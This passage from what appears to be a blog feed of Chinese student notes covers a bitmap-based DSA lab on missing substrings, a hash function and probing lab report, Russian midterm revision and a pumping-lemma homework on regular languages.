operator">-&gt;</span><span class="token function">test</span><span class="token punctuation">(</span>pos<span class="token punctuation">)</span><span class="token punctuation">)</span>        get <span class="token operator">+=</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token punctuation">(</span>k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    a<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>get<span class="token punctuation">)</span><span class="token punctuation">;</span>    b<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>get <span class="token operator">&gt;&gt;=</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token function">set_end</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> b<span class="token punctuation">,</span> len <span class="token operator">-</span> k<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为此, 首先读入 <code>str</code> 末端的 $k$ 长子串 <code>get</code>, 调用 <code>a-&gt;set(get)</code> 将其存储在 <code>Bitmap* a</code> 中, 并使用一个 <code>while</code> 循环遍历接下来所有 $k$ 长子串.</p><h4 id="void-set-end"><a href="#void-set-end" class="headerlink" title="void set_end()"></a>void set_end()</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 68</span><span class="token keyword">void</span> <span class="token function">set_end</span> <span class="token punctuation">(</span>Bitmap<span class="token operator">*</span> str<span class="token punctuation">,</span> Bitmap<span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> pos<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    a<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span> pos <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>调用 <code>set_end()</code> 将 <code>str</code> 末尾的 $k - 1$ 位 $01$ 子串加入 <code>Bitmap* b</code>.</p><p>考虑到长度为 $k - 1$ 的子串. 对于所有 $k$ 长子串的十进制值 $S_1, S_2, \cdots, S_{\vert A\vert - k + 1}$, 长度为 $k - 1$ 的子串恰为所有 $k$ 长子串删去最后一位, 再补上 <code>str</code> 中末端的 $k - 1$ 长子串, 其十进制值 $R_1 = S_1\gg 1, R_2 = S_2\gg 1, \cdots, R_{\vert A\vert - k + 1} = S_{\vert A\vert - k + 1}\gg 1, R_{\vert A\vert - k + 2}$, 其中 $R_{\vert A\vert - k + 2}$ 调用 <code>set_end(str, b, len - k, k)</code> 来设置.</p><p>接下来调用 <code>check_full(b, k)</code> 检查 <code>Bitmap* b</code> 中是否已经存储了所有 $k - 1$ 长子串.</p><h4 id="void-get-ans"><a href="#void-get-ans" class="headerlink" title="void get_ans()"></a>void get_ans()</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 82</span><span class="token keyword">void</span> <span class="token function">get_ans</span> <span class="token punctuation">(</span>Bitmap<span class="token operator">*</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> output<span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> precision<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>a<span class="token operator">-&gt;</span><span class="token function">test</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            output <span class="token operator">=</span> i<span class="token punctuation">;</span>            precision <span class="token operator">=</span> k<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>若所有 $k - 1$ 长子串都已经存储在了 <code>Bitmap* b</code> 中, 那么说明 <code>str</code> 中首个未出现的字符串长度为 $k$, 只需调用 <code>get_ans(a, k, output, precision)</code> 在 <code>Bitmap* a</code> 中遍历寻找首个未出现的 $k$ 长子串, 并调用 <code>show_ans(output, precision)</code> 输出在原串中未出现的最短且字典序最小的 $k$ 长子串即可.</p><h4 id="void-trans"><a href="#void-trans" class="headerlink" title="void trans()"></a>void trans()</h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 54</span><span class="token keyword">void</span> <span class="token function">trans</span> <span class="token punctuation">(</span>Bitmap<span class="token operator">*</span> a<span class="token punctuation">,</span> Bitmap<span class="token operator">*</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">&lt;&lt;</span> k<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token operator">-&gt;</span><span class="token function">test</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>            b<span class="token operator">-&gt;</span><span class="token function">set</span><span class="token punctuation">(</span>i <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>否则, 若存在 $k - 1$ 长子串未存储在 <code>Bitmap* b</code> 中, 那么调用 <code>copy(a, b)</code> 将 <code>Bitmap* b</code> 的值赋给 <code>Bitmap* a</code>, <code>k</code> 自减, 并调用 <code>b-&gt;clean()</code> 将 <code>Bitmap* b</code> 置零. 此时 <code>Bitmap* a</code> 存储了所有 $k$ 长子串, 并调用 <code>trans(a, b, k)</code> 利用其中值更新 <code>Bitmap* b</code> 中的 $k - 1$ 长子串, 仍然需要使用 <code>set_end(str, b, len - k, k)</code> 将 <code>str</code> 末端的子串加入 <code>b</code>.</p><p>当遍历到长度为 $k - 1$ 的串全部存在, 而 $k$ 长子串存在缺失时, 将 $k$ 长子串所缺少十进制值对应的首个 $01$ 子串输出.</p><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>第一次读入串 <code>str</code> 的时间复杂度为 $O(\vert A\vert)$;</p><p>对于子串的处理考虑极端情况, 对 $k$ 长子串存储、遍历枚举、更新所需要时间为 $O(2^k)$, 若从长 $24$ 子串遍历至长 $1$ 子串, 消耗时间为 $O(2^{25})$.</p><p>综上, 算法最坏时间复杂度为 $O(\vert A\vert + 2^{25})$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>空间复杂度主要来自于使用了 <code>Bitmap</code> 存储目的串的过程.</p><p>最坏情况下开辟了两个可存储 $2^{24}$ <code>bit</code>, 一个可存储 $2^{23}$ <code>bit</code> 的 <code>Bitmap</code>, 最坏情况空间复杂度为: $(2\times 2^{24} + 2^{23}) bit = 5\times 2^{20} B = 5MB$, 在题目要求范围内.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HashFun</title>
      <link href="/2022/11/13/hashfun/"/>
      <url>/2022/11/13/hashfun/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-LAB2"><a href="#CST-LAB2" class="headerlink" title="CST LAB2"></a>CST LAB2</h1><h2 id="HashFun"><a href="#HashFun" class="headerlink" title="HashFun"></a>HashFun</h2><h3 id="策略实现-396字"><a href="#策略实现-396字" class="headerlink" title="策略实现 (396字)"></a>策略实现 (396字)</h3><h4 id="good-hashing"><a href="#good-hashing" class="headerlink" title="good_hashing"></a><code>good_hashing</code></h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> good_hashing<span class="token double-colon punctuation">::</span><span class="token keyword">operator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">,</span> <span class="token keyword">int</span> N<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> seed <span class="token operator">=</span> <span class="token number">131</span><span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> hash <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span>str<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        hash <span class="token operator">=</span> hash <span class="token operator">*</span> seed <span class="token operator">+</span> str<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        hash <span class="token operator">%=</span> N<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> hash<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此处参考了 <code>BKDR hash</code> 函数, 使用 <code>seed = 131</code> 作为种子, 可实现较为均匀的 <code>hash</code> 映射.</p><h4 id="poor-hashing"><a href="#poor-hashing" class="headerlink" title="poor_hashing"></a><code>poor_hashing</code></h4><p><code>poor_hashing</code> 函数定义为: <script type="math/tex">poor\_hashing(str)=89\{\sum_{i = 0}^{len(str)-1} str[i]\}\%N.</script></p><p>由于 <code>ascii</code> 的大小为 <code>0~127</code>, 且字符串长度受限制, 生成的 <code>hash</code> 值最多不会超过 <code>200000</code>, 这导致了不均匀的到 <code>TABLE_SIZE</code> 的映射; 同时对字符串直接求和的操作很容易导致 <code>collision</code>.</p><h4 id="quadratic-probe"><a href="#quadratic-probe" class="headerlink" title="quadratic_probe"></a><code>quadratic_probe</code></h4><p>定义 <code>int dist</code> 为当前双向试探的试探长度, <code>bool direction</code> 为当前双向试探的试探方向. 每次执行 <code>init()</code> 时, 初始化 <code>dist = 0; direction = false;</code>.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> quadratic_probe<span class="token double-colon punctuation">::</span><span class="token keyword">operator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>hash_entry<span class="token operator">*</span> Table<span class="token punctuation">,</span> <span class="token keyword">int</span> table_size<span class="token punctuation">,</span> <span class="token keyword">int</span> last_choice<span class="token punctuation">)</span><span class="token punctuation">{</span>    dist<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> offset<span class="token punctuation">,</span> pos<span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>direction<span class="token punctuation">)</span> <span class="token punctuation">{</span>        direction <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        offset <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">(</span>dist <span class="token operator">*</span> dist<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> table_size<span class="token punctuation">;</span>        pos <span class="token operator">=</span> last_choice <span class="token operator">-</span> offset<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>pos <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> pos <span class="token operator">+=</span> table_size<span class="token punctuation">;</span>        <span class="token keyword">return</span> pos<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>每次冲突时, 依据 <code>direction</code> 的值决定偏移方向, 依据 <code>dist</code> 的大小决定偏移量.</p><h4 id="overflow-probe"><a href="#overflow-probe" class="headerlink" title="overflow_probe"></a><code>overflow_probe</code></h4><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token generic-function"><span class="token function">dynamic_cast</span><span class="token generic class-name"><span class="token operator">&lt;</span>overflow_probe<span class="token operator">*</span><span class="token operator">&gt;</span></span></span><span class="token punctuation">(</span>my_collision<span class="token punctuation">)</span><span class="token punctuation">)</span>    table_size <span class="token operator">=</span> <span class="token number">400031</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>此处修改了测试框架, 若 <code>my_collision</code> 可成功动态转换为 <code>overflow_probe*</code> 指针, 此时使用公共溢出区策略, 将 <code>table_size</code> 修改为 <code>400031</code>.</p><p>定义 <code>int overflow_head</code> 为当前缓冲区的起始 <code>index</code>. 每次执行 <code>init()</code> 时, 初始化 <code>overflow_head = 400031</code>.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> overflow_probe<span class="token double-colon punctuation">::</span><span class="token keyword">operator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">(</span>hash_entry<span class="token operator">*</span> Table<span class="token punctuation">,</span> <span class="token keyword">int</span> table_size<span class="token punctuation">,</span> <span class="token keyword">int</span> last_choice<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> overflow_head<span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>每次冲突时, 顺次遍历缓冲区直到返回一个可供插入词条的空位置.</p><h3 id="测试数据-222字"><a href="#测试数据-222字" class="headerlink" title="测试数据 (222字)"></a>测试数据 (222字)</h3><p><code>generator.cpp</code> 作为数据生成器.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* generator.cpp */</span><span class="token function">srand</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>num <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">500000</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用当前时间作为随机数种子, 产生 <code>1~500000</code> 内的随机数作为行号, 将 <code>poj.txt</code> 的该行信息作为输入数据;</p><p>使用 <code>ReadLine(filename, line)</code> 读入 <code>poj.txt</code> 的指定行信息;</p><p>使用 <code>GenerateInsert(srt)</code> 与 <code>GenerateQuery(srt)</code> , 通过 <code>string</code> 的 <code>substr()</code> 与 <code>find()</code> 方法从该行字符串中构造符合格式的输入数据;</p><p><code>shuffle_pattern</code> 决定是否对插入和删除操作进行打乱 (即随机化).</p><ul><li>数据 <code>01.in</code> 进行了 <code>40000</code> 次插入, <code>40000</code> 次查询,  遵循先插入后查询的次序;</li><li>数据 <code>02.in</code> 进行了 <code>100000</code> 次插入, <code>100000</code> 次查询, 遵循先插入后查询的次序; </li><li>数据 <code>03.in</code> 进行了 <code>100000</code> 次插入, <code>100000</code> 次查询,  遵循边插入边查询的次序.</li></ul><blockquote><p>生成数据的参数附在 <code>parameters.txt</code> 中.</p></blockquote><h3 id="分析结果-276字"><a href="#分析结果-276字" class="headerlink" title="分析结果 (276字)"></a>分析结果 (276字)</h3><ol><li>“好” 哈希函数的性能更佳. 因为 “坏” 哈希函数将字符串不均匀地映射到哈希表中, 容易导致<code>hash</code>聚集, 增大了冲突可能, 在处理冲突时会消耗更多时间.</li><li>双向平方试探性能更佳. 当数据规模较大时, 使用双向平方试探移动出冲突区域的效率较高; 同时, 比起使用 “坏” 哈希函数, 使用 “好” 哈希函数时这种移动的效率会更高.</li><li>使用 “好” 哈希函数时封闭散列性能略占优, 使用 “坏” 哈希函数时开放散列性能明显占优, 总体上开放散列性能占优. 在数据装填因子大、哈希函数均匀的情况下适合使用封闭散列.</li><li>这会导致字符串分布出现一定的规律性, 映射后的 <code>hash</code> 冲突较为严重, 使得性能出现下降.</li><li>模拟 <code>vector</code> 类的扩容, 在装填因子较大或较小时, 重新动态分配 <code>hash_entry* new_table</code>, 迁移原表数据, 并释放原指针即可.</li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Russian Midterm Revision</title>
      <link href="/2022/11/10/russian-midterm-revision/"/>
      <url>/2022/11/10/russian-midterm-revision/</url>
      
        <content type="html"><![CDATA[<h3 id="及物动词"><a href="#及物动词" class="headerlink" title="及物动词"></a><strong>及物动词</strong></h3><ul><li>есть; </li><li>делать, читать, считать, искать, знать, слушать; </li><li>смотреть, писать, учить.</li></ul><ol><li><p>делать (做):</p><p>делать урок; делать <strong>упражнение</strong>;</p></li><li><p>читать (读):</p><p>читать <strong>книгу</strong>; читать текст; читать диалог; читать <strong>стихи</strong> (诗歌); </p></li><li><p>считать (数):</p><p>считать бананы; </p></li><li><p>искать (寻找):</p><p>искать часы; искать плащ; искать <strong>счастье</strong>; </p></li><li><p>знать (了解, 认识):</p><p>знать это; знать тебя; знать <strong>русский язык</strong> (俄语); </p></li><li><p>слушать (听):</p><p>слушать <strong>музыку</strong>; слушать текст; слушать <strong>диалог</strong>; слушать <strong>стихи</strong>;</p></li><li><p>смотреть (看):</p><p>смотреть <strong>телевизор</strong> (电视); смотреть <strong>фильм</strong> (电影); </p></li><li><p>писать (写):</p><p>писать <strong>письмо</strong> (信); писать новые слова; писать диалог; писать <strong>стихи</strong>. </p></li></ol><h3 id="非及物动词"><a href="#非及物动词" class="headerlink" title="非及物动词"></a><strong>非及物动词</strong></h3><ul><li>работать, отдыхать, ужинать, играть, жить; </li><li>говорить, хотеть, обедать, учиться.</li></ul><ol><li><p>работать (工作):</p><p>работать на заводе; работать в Пекине; работать в Москве; работать на юге;</p></li><li><p>отдыхать (休息):</p><p>отдыхать дома; отдыхать на юге;</p></li><li><p>завтракать, обедать, ужинать (吃早 / 午 / 晚饭):</p><p>~ дома; ~ в кафе; ~ в институте; ~ в <strong>буфете</strong> (小吃部);</p></li><li><p>жить (居住):</p><p>жить дома; жить в институте; жить в Санкт-Петербурге;</p></li><li><p>играть (玩):</p><p>играть в футбол; играть в шахматы;</p></li><li><p>говорить (说):</p><p>говорить <strong>по-русски</strong>; говорить <strong>по-китайски</strong>;</p></li><li><p>хотеть (想):</p><p>хотеть читать <strong>стихи</strong>; хотеть смотреть <strong>телевизор</strong>; хотеть слушать музыку.</p></li></ol><h3 id="会说十种语言"><a href="#会说十种语言" class="headerlink" title="会说十种语言"></a><strong>会说十种语言</strong></h3><p>говорить по-xxx</p><ul><li><strong>русски</strong> 俄语</li><li><strong>китайски</strong> 汉语</li><li>английски 英语</li><li>немецки 德语</li><li>французски 法语</li><li>японски 日语</li><li>корейски 朝鲜语</li><li>испански 西班牙语</li><li>арабски 阿拉伯语</li><li>итальянски 意大利语</li></ul><h3 id="时间表示法"><a href="#时间表示法" class="headerlink" title="时间表示法"></a><strong>时间表示法</strong></h3><ul><li>один час, час;</li><li>два / три / четыре часа;</li><li>пять / шесть / семь / восемь / девять / десять / одиннадцать / двенадцать часов.</li></ul><h3 id="常用词组"><a href="#常用词组" class="headerlink" title="常用词组"></a><strong>常用词组</strong></h3><ul><li>我 / 你 / 您 / 他 / 她叫… : меня / тебя / вас / его / её зовут…;</li><li>在喷泉旁 : у фонтана;</li><li>您的儿子 : ваш сын;</li><li>我的朋友 : мой друг; <strong>моя подруга</strong>;</li><li>你们的新房子 : ваш новый дом;</li><li>我的旧作业本 : моя старая тетрадь;</li><li>他的新车 : его новая машина;</li><li>我们的旧桌子 : наш старый стол;</li><li>你们的旧花园 : ваш старый сад;</li><li>他们的新护照 : <strong>их новые паспорта</strong>; </li><li>在工厂工作 : работать на заводе; </li><li>在学院里工作 : работать в институте; </li><li>在剧院里工作 : работать в театре; </li><li>读书 : <strong>читать книгу</strong>;</li><li>懂俄语 : <strong>знать русский язык</strong>;</li><li>了解你 : <strong>знать тебя</strong>;</li><li>听音乐 : слушать музыку;?</li><li>在南方休息 :  отдыхать на юге;</li><li>在疗养院休息 : <strong>отдыхать в санатории</strong>;</li><li>在家休息 : отдыхать дома;</li><li>在家吃早餐 : <strong>завтракать дома</strong>;</li><li>在咖啡厅吃午餐 : обедать в кафе;</li><li>在小吃部吃晚餐 : <strong>ужинать в буфете</strong>;</li><li>在教室里做功课 : <strong>делать урок в аудитории</strong>;</li><li>在宿舍里做练习 : <strong>делать упражнение в общежитии</strong>;</li><li>踢足球 : играть в футбол;</li><li>下象棋 : играть в шахматы;</li><li>数香蕉 : считать бананы;</li><li>数菠萝 : считать ананасы;</li><li>写生词 : <strong>писать новые слова</strong>;</li><li>住在莫斯科 : жить в Москве;</li><li>住在上海 : жить в Шанхае;</li><li>说俄语 : <strong>говорить по-русски</strong>; </li><li>说汉语 : <strong>говорить по-китайски</strong>; </li><li>说英语 : <strong>говорить по-английски</strong>; </li><li>背单词 : <strong>учить новые слова</strong>; </li><li>渴望上大学 : <strong>хотеть учиться в университете</strong>; </li><li>渴望在俄罗斯留学 : <strong>хотеть учиться в России</strong>; </li><li>关于我 : <strong>обо мне</strong>; </li><li>3点钟 : три часа; </li><li>5点钟 : пять часов; </li><li>看电视 : <strong>смотреть телевизор</strong>;</li><li>看书 : <strong>читать книгу</strong>; </li><li>寻找教科书 : <strong>искать учебник</strong>; </li><li>今天、昨天、明天 : <strong>сегодня, вчера, завтра</strong>; </li><li>星期二、星期三、星期六 : <strong>вторник, среда, суббота</strong>; </li><li>请问 : <strong>скажите, пожалуйста</strong>;</li><li>几点钟 : <strong>который час</strong>; </li><li>很好 : <strong>очень хорошо</strong>.</li></ul><h3 id="常用问答句型"><a href="#常用问答句型" class="headerlink" title="常用问答句型"></a><strong>常用问答句型</strong></h3><ul><li><p>—Что вы делаете? </p><p>—Я читаю книгу. Я делаю урок.</p></li><li><p><strong>—Что Анна ищет?</strong> </p><p>—Она ищет плащ. </p></li><li><p>—Что ты учишь? </p><p>—Я учу новые слова. </p></li><li><p>—Что ты считаешь? </p><p>—Я считаю ананасы и бананы. </p></li><li><p>—Что они читают? </p><p>—Они читают текст и диалог. </p></li><li><p><strong>—Что ты хочешь делать?</strong> </p><p>—Я хочy учиться в институте. </p></li></ul><ul><li><p><strong>—Что ест твоя сестра (姐妹)?</strong> </p><p>—Она ест суп и салат. </p></li><li><p><strong>—Что учит твой брат?</strong> </p><p>—Он учит новые слова. </p></li><li><p><strong>—Что пишет Инна?</strong> </p><p><strong>—Она пишет письмо. (信)</strong></p></li><li><p><strong>—Что слушают дети?</strong> </p><p>—Они слушают музыку. </p></li></ul><ul><li><p><strong>—Где ты завтракаешь обычно?</strong> </p><p>—Я обычно завтракаю дома. </p></li><li><p><strong>—Где работает твой отец?</strong> </p><p>—Он работает в институте. </p></li><li><p><strong>—Где учится Витя?</strong></p><p>—Он учится в школе. </p></li><li><p>—Где живёт Антон? </p><p>—Он живёт в Санкт-Петербурге. </p></li></ul><ul><li><p><strong>—Который час сейчас?</strong> </p><p><strong>—Сейчас восемь часов.</strong> </p></li><li><p><strong>—Почему Антон много работает?</strong> </p><p>—Он хочет учиться в институте. </p></li><li><p>—Миша живёт в Москве или в Баку?</p><p>—Он живёт в Москве. </p></li><li><p><strong>—Они часто говорят о тебе?</strong> </p><p>—Да, они часто говорят обо мне. </p></li></ul><ul><li><p>—Это стакан? </p><p>—Нет, это ваза. </p></li><li><p><strong>—Чей это шкаф?</strong> </p><p>—Это мой шкаф. </p></li><li><p><strong>—Какая это комната?</strong> </p><p>—Это новая комната. </p></li></ul><ul><li><p><strong>—Как ты говоришь по-русски?</strong> </p><p>—Я говорю по-русски очень хорошо. </p></li><li><p>—Как его зовут?</p><p>—Его зовут Пётр. </p></li><li><p><strong>—Как работает твой брат?</strong> </p><p>—Он работает очень хорошо.</p></li></ul><h3 id="以-b-结尾阳性名词"><a href="#以-b-结尾阳性名词" class="headerlink" title="以 b 结尾阳性名词"></a><strong>以 b 结尾阳性名词</strong></h3><ul><li>словарь (字典), гость (客人), конь (公马); </li></ul><h3 id="以-b-结尾阴性名词"><a href="#以-b-结尾阴性名词" class="headerlink" title="以 b 结尾阴性名词"></a><strong>以 b 结尾阴性名词</strong></h3><ul><li>мать (妈妈), ночь (夜晚), тетрадь (练习本), обувь (鞋子总称), осень (秋天);</li><li>пять, шесть, семь, восемь, девять, десять, одиннадцать, двенадцать (数词).</li></ul><h3 id="六格"><a href="#六格" class="headerlink" title="六格"></a><strong>六格</strong></h3><ul><li><strong>第一格: 主格</strong>, 通常作为主语或谓语.</li><li><strong>第二格: 所属格</strong>, 通常置于它所说明的名词之后, 如 остановка автобуса (公共汽车停车站), сады России (俄罗斯的花园).</li><li><strong>第三格: 给格</strong>, 如 “妈妈给儿子买了新书包” 中 “儿子” 要变第三格.</li><li><strong>第四格:</strong> <ul><li>第一个意义: <strong>客体格</strong>, 表示行为的客体, 如 Он ест суп (他在吃汤), Как тебя зовут (你叫什么名字). </li><li>第二个意义: <strong>方向格</strong>, 如 Я иду на урок. (我去上课), 公式为 运动动词 + на(去…上) 或в(去…里) + 第四格 = 方向. </li><li>第三个意义: <strong>在时间内</strong>, 如 в субботу (在星期六), 公式为 в + 表示时间的名词第四格.</li></ul></li><li><strong>第五格: 工具格</strong>, 如 Антон пишет упражнение ручкой (安东用签字笔写练习).</li><li><strong>第六格: 处所格, 也称前置格</strong>, 必须永远跟着前置词, 表示 “在…地方”, “关于…人、…事儿”, 如 на столе (在桌子上), в столе (在桌子里), о Пушкине (关于普希金), о саде (关于花园). </li></ul>]]></content>
      
      
      <categories>
          
          <category> Russian </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Russian </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业5</title>
      <link href="/2022/11/07/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-5/"/>
      <url>/2022/11/07/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-5/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-4-1-1-e"><a href="#Ex-4-1-1-e" class="headerlink" title="Ex 4.1.1 (e)"></a>Ex 4.1.1 (e)</h3><p>​    对于任意的 $n \ge 1$, 存在 $w = 0^n1^n\in\left\{0^n1^m\mid n\le m\right\}$.</p><p>​    考虑任意 $x, y, z$ 满足 $w = xyz$, $\vert xy\vert &lt; n$, 且 $y\ne\varepsilon$.</p><p>​    那么易知存在 $i\in N$, 使得 $y = 0^i$.</p><p>​    此时取 $k = 2$, 注意到</p><p>​    <script type="math/tex">xy^2z = 0^{n + i}1^n\notin\left\{0^n1^m\mid n\le m\right\}.</script></p><p>​    因此 $w$ 不满足 $Pumping$ 引理, 该语言不是正规语言.</p><h3 id="Ex-4-1-2-e"><a href="#Ex-4-1-2-e" class="headerlink" title="Ex 4.1.2 (e)"></a>Ex 4.1.2 (e)</h3><p>​    对于任意的 $n \ge 1$, 存在 $\omega = 0^n10^n1\in\left\{ww\mid w\in{0, 1}^{*}\right\}$.</p><p>​    考虑任意 $x, y, z$ 满足 $\omega = xyz$, $\vert xy\vert &lt; n$, 且 $y\ne\varepsilon$.</p><p>​    那么易知存在 $i\in N$, 使得 $y = 0^i$.</p><p>​    此时取 $k = 2$, 注意到</p><p>​    <script type="math/tex">xy^2z = 0^{n + i}10^n1\notin\left\{ww\mid w\in{0, 1}^{*}\right\}.</script></p><p>​    因此 $\omega$ 不满足 $Pumping$ 引理, 该语言不是正规语言.</p><h3 id="Ex-4-1-2-f"><a 